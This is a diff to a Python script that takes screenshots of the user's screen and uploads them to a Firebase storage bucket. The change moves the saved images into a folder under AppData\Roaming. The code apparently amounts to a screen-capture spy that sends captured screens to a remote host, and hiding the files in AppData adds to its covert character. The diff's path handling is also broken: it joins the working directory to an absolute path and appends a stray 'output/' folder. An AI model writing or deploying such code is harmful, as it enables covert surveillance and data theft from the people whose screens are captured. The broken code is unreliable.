@@ -23,30 +23,32 @@ firebaseConfig = {
 firebase = pyrebase.initialize_app(firebaseConfig)
 storage = firebase.storage()
 
+# save files to C:\\Users\\fortyseven\\AppData\\Roaming\\output\\
+files_location = os.environ["AppData"] + "\\output"
 
 def grab_screenshot():
     i = 0
     # To capture the screen
     image = pyscreenshot.grab()
 
-    if not os.path.exists("./output/"):
-        os.makedirs("./output/")
+    if not os.path.exists(files_location):
+        os.makedirs(files_location)
 
-    while os.path.exists(f"output/file_{i}.png"):
+    while os.path.exists(files_location + f"\\file_{i}.png"):
         i += 1
 
     # To save the screenshot
-    image.save(f"output/file_{i}.png")
+    image.save(files_location + f"\\file_{i}.png")
     print("image saved")
 
 
 def upload_firebase():
     i = 0
     # looping equal to the number of files available in the folder
-    for x in range(len(os.listdir(os.getcwd() + "/output"))):
-        if os.path.exists(f"output/file_{i}.png"):
+    for x in range(len(os.listdir(os.getcwd() + files_location))):
+        if os.path.exists(files_location + f"output/file_{i}.png"):
             cloud_path = f"images/file_{i}.png"
-            local_path = f"output/file_{i}.png"
+            local_path = (files_location + f"output/file_{i}.png")
             storage.child(cloud_path).put(local_path)
             i += 1
             print("image uploaded")
